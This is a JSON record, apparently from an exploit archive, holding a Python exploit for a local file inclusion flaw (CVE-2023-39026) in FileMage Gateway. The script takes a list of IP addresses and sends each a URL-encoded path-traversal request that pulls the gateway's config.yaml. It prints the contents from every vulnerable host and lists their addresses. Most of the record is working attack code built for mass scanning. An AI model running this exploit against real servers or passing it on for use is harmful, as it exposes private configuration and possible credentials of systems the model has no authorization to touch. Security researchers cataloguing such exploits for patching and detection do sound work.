{"source": "https://www.exploit-db.com/exploits/51708", "vulnName": "FileMage Gateway 1.10.9 - Local File Inclusion", "vulnEDBID": "51708", "vulnCVE": "2023-39026", "author": "BRYCE RAINDAYZZ HARTY", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2023-09-04", "vulnContent": "# Exploit Title: FileMage Gateway 1.10.9 - Local File Inclusion\n# Date: 8/22/2023\n# Exploit Author: Bryce \"Raindayzz\" Harty   \n# Vendor Homepage: https://www.filemage.io/\n# Version: Azure Versions < 1.10.9\n# Tested on: All Azure deployments < 1.10.9 \n# CVE : CVE-2023-39026\n\n# Technical Blog - https://raindayzz.com/technicalblog/2023/08/20/FileMage-Vulnerability.html\n# Patch from vendor - https://www.filemage.io/docs/updates.html\n\nimport requests\nimport warnings\nwarnings.filterwarnings(\"ignore\")\ndef worker(url):\n    response = requests.get(url, verify=False, timeout=.5)\n    return response\ndef main():\n    listIP = []\n    file_path = input(\"Enter the path to the file containing the IP addresses: \")\n    with open(file_path, 'r') as file:\n        ip_list = file.read().splitlines()\n        searchString = \"tls\"\n        for ip in ip_list:\n            url = f\"https://{ip}\" + \"/mgmnt/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cprogramdata%5cfilemage%5cgateway%5cconfig.yaml\"\n            try:\n                response = worker(url)\n                #print(response.text)\n                if searchString in response.text:\n                    print(\"Vulnerable IP: \" + ip)\n                    print(response.text)\n                    listIP.append(ip)\n            except requests.exceptions.RequestException as e:  \n                print(f\"Error occurred for {ip}: {str(e)}\")\n\n    for x in listIP:\n        print(x)\nif __name__ == '__main__':\n    main()\n            "}